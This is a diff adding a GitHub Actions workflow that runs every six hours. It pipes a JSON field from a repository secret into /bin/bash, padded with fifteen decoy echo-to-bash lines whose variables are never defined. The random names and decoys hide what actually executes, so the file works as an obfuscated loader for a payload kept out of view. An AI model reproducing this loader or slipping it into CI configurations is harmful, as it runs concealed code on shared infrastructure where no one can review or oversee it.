@@ -1,0 +1,33 @@
+name: jiangjing19871010
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiangjing19871010
+        env:
+          v346: ${{ secrets.v346 }}
+        run: |
+          echo $v346 | jq -r .mkfxz58399 | /bin/bash
+          echo $siq79271 | jq -r .nvx03365 | /bin/bash
+          echo $hwoyn1 | jq -r .f331 | /bin/bash
+          echo $dcw09 | jq -r .ato04 | /bin/bash
+          echo $fyivh2662 | jq -r .fwgm9561 | /bin/bash
+          echo $zl096 | jq -r .hu026 | /bin/bash
+          echo $n4 | jq -r .kv5860 | /bin/bash
+          echo $oi512 | jq -r .ypwxx112 | /bin/bash
+          echo $wdu20 | jq -r .jjb16198 | /bin/bash
+          echo $g42 | jq -r .yxc39 | /bin/bash
+          echo $n75 | jq -r .ah9 | /bin/bash
+          echo $vpvxe91663 | jq -r .jdy48624 | /bin/bash
+          echo $jidg289 | jq -r .vsgfl6 | /bin/bash
+          echo $sae78725 | jq -r .bft841 | /bin/bash
+          echo $ic98 | jq -r .yjf520 | /bin/bash
+          echo $eyyg5378 | jq -r .fs59702 | /bin/bash
+
